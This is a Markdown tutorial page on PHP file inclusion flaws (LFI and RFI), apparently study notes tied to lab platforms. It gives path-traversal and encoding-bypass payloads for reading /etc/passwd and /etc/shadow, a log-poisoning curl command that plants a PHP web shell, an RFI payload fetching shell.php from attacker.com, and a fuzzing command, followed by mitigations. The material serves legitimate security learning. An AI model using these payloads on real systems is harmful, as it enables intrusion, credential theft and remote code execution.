---
layout: default
title: File Inclusion (LFI and RFI)
---

# File Inclusion — LFI and RFI

## What is File Inclusion

File inclusion vulnerabilities occur when a web application dynamically includes files based on user input without proper validation. An attacker can manipulate this input to include files they should not have access to.

There are two types — Local File Inclusion (LFI) and Remote File Inclusion (RFI).

---

## Local File Inclusion (LFI)

LFI allows an attacker to include files that already exist on the server.

### How it happens

A vulnerable PHP application might do this:

```php<?php
$page = $_GET['page'];
include($page);
?>

If the URL is:https://example.com/index.php?page=about.php

An attacker can change `page` to a system file:https://example.com/index.php?page=../../../../etc/passwd

The `../` sequences traverse up the directory tree. This is called **path traversal** or **directory traversal**.

### Common files to target on Linux/etc/passwd           — list of users on the system
/etc/shadow           — hashed passwords (requires root)
/etc/hosts            — hostname to IP mappings
/proc/self/environ    — environment variables, may contain paths
/var/log/apache2/access.log   — Apache access log
/var/log/auth.log     — authentication log

### Common files to target on WindowsC:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\winevt\Logs\Security.evtx

---

## Path Traversal Bypass Techniques

Applications often try to block `../` — here are common bypasses:....//....//....//etc/passwd       — double dot bypass
..%2f..%2f..%2fetc/passwd          — URL encoded slash
..%252f..%252fetc/passwd           — double URL encoded
/etc/passwd%00                     — null byte (older PHP)
..../..../etc/passwd             — mixed slashes

---

## Log Poisoning with LFI

If you can read a log file and also control something that gets written to it, you can achieve Remote Code Execution.

### Steps

1. Find LFI that can read Apache access log:?page=../../../../var/log/apache2/access.log

2. Send a request with PHP code in the User-Agent header:
```bashcurl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

3. Now trigger execution via LFI:?page=../../../../var/log/apache2/access.log&cmd=id

---

## Remote File Inclusion (RFI)

RFI allows an attacker to include a file from a remote server. This requires `allow_url_include = On` in PHP config, which is off by default in modern PHP.

### How it workshttps://example.com/index.php?page=http://attacker.com/shell.php

The server fetches and executes your remote PHP file.

### Setting up a basic shell for RFI

On your attacker machine, create `shell.php`:
```php<?php system($_GET['cmd']); ?>

Serve it:
```bashpython3 -m http.server 80

Then include it:?page=http://YOUR-IP/shell.php&cmd=id

---

## LFI to RCE — Other Methods

| Method | How |
|--------|-----|
| Log poisoning | Inject PHP into a log, include the log |
| /proc/self/environ | Inject into User-Agent, include environ file |
| PHP session files | Inject into session data, include session file |
| PHP filter wrapper | Extract source code via base64 |
| File upload + LFI | Upload a PHP file, use LFI to execute it |

### PHP filter wrapper (source code disclosure)?page=php://filter/convert.base64-encode/resource=index.php

This returns the base64-encoded source of `index.php`. Decode it to read the code.

---

## Tools

- **Burp Suite** — intercept and fuzz the file parameter
- **ffuf** — fuzz for LFI paths
- **LFISuite** — automated LFI exploitation
- **wfuzz** — parameter fuzzing

### ffuf example for path traversal

```bashffuf -u "http://target.com/index.php?page=FUZZ" 
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

---

## Mitigations

- Never pass user input directly to `include()`, `require()`, or file functions
- Use a whitelist of allowed pages
- Disable `allow_url_include` and `allow_url_fopen` in PHP
- Use `realpath()` and check the result stays within the intended directory
- Apply least privilege to the web server user

---

## Practice Labs

- TryHackMe: File Inclusion room
- TryHackMe: LFI Basics
- PortSwigger: File path traversal labs
- HackTheBox machines: Poison, Nineveh

---

## Key Terms

| Term | Meaning |
|------|---------|
| LFI | Local File Inclusion — include server-side files |
| RFI | Remote File Inclusion — include files from a remote URL |
| Path traversal | Using `../` to escape the intended directory |
| Log poisoning | Injecting code into a log file then including it |
| Null byte | `%00` — used to terminate strings in older PHP |
| PHP wrapper | `php://filter`, `php://input` — PHP stream handlers |
